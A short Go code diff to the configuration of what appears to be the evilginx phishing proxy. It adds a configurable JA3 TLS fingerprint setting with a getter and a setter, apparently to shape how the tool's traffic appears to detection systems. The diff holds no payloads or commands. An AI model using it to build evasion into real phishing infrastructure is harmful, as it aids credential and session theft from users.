@@ -132,6 +132,7 @@ type GeneralConfig struct {
 	TrustedProxies   []string `mapstructure:"trusted_proxies" json:"trusted_proxies" yaml:"trusted_proxies"`
 	ServerCookieName string   `mapstructure:"server_cookie_name" json:"server_cookie_name" yaml:"server_cookie_name"`
 	WebAdminPort     int      `mapstructure:"web_admin_port" json:"web_admin_port" yaml:"web_admin_port"`
+	Ja3Fingerprint   string   `mapstructure:"ja3_fingerprint" json:"ja3_fingerprint" yaml:"ja3_fingerprint"`
 }
 
 type Config struct {
@@ -472,6 +473,18 @@ func (c *Config) SetHttpPort(port int) {
 	c.general.HttpPort = port
 	c.cfg.Set(CFG_GENERAL, c.general)
 	log.Info("http port set to: %d", port)
+	c.cfg.WriteConfig()
+}
+
+func (c *Config) GetJa3Fingerprint() string {
+	return c.general.Ja3Fingerprint
+}
+
+func (c *Config) SetJa3Fingerprint(fingerprint string) {
+	c.general.Ja3Fingerprint = fingerprint
+	c.cfg.Set(CFG_GENERAL, c.general)
+	log.Info("JA3 fingerprint set to: %s", fingerprint)
+	log.Warning("you may need to restart evilginx for the changes to take effect")
 	c.cfg.WriteConfig()
 }
 
